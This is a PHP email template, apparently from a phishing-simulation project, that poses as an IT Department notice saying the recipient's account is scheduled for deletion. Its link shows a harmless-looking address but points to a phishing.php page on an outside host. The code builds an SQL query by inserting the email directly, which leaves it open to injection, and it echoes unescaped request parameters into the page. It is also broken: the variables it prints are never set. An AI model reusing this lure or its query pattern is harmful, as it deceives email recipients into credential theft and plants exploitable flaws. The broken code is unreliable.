<?php
    session_start();
    error_reporting(0);
    include("dbconnect.php");
            
    $email = $_GET["email"];
    $template = $_GET["template"];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Template</title>
    <!--CSS only-->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <style type="text/css">

        .center {
        display: block;
        margin-left: auto;
        margin-right: auto;
        width: 50%;
        }

    </style>
</head>

<body>
    <!-- <center class="wrapper"> -->
        <div class="container">
            <div class="row my-3">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">Dear 
                <?php
                    session_start();
                    error_reporting(0);
                    include("dbconnect.php");
                    $email = $_SESSION['email'];
                    // echo $email;
                    $index = 1;
                    
                    $sqlloadtarget = "SELECT * FROM tbl_target WHERE email = '$email'";
                    $result = $conn->query($sqlloadtarget);
                    
                    echo $target_name ?> ,</p>
            </div>
            <div class="row my-2">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    This email account has been scheduled for deletion by administrator.</p>
            </div>
            <div class="row my-2">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    Username: <?php
                    session_start();
                    error_reporting(0);
                    include("dbconnect.php");
                    $email = $_SESSION['email'];
                    // echo $email;
                    $index = 1;
                    
                    $sqlloadtarget = "SELECT * FROM tbl_target WHERE email = '$email'";
                    $result = $conn->query($sqlloadtarget);
                    
                    echo $target_email ?>
                </p>
            </div>
            <div class="row my-2">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    If this is correct, simply do nothing.</p>   
            </div>
            <div class="row my-2">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    If you believe this has been done in error, or you wish to make changes to your request. click the link below.</p>
            </div>
            <div class="row my-2 ps-4 center">
                <a href="https://hubbuddies.com/271317/xiphias/php/phishing.php?email=<?php echo $email ?>&template=<?php echo $template ?>" name="phishingEmail" class="link-primary">https://company/scheduled/username/</a>
            </div>
            <div class="row my-2">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    If you have any trouble accessing the site, please let us know.</p>
            </div>
            <div class="row mt-2">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    Thanks,</p>
            </div>
            <div class="row">
                <p class="center" style="font-family: sans-serif; font-size: medium; max-width: 600px;">
                    IT Department.</p>
            </div>
        </div>
    <!-- </center> -->
    
</body>
</html>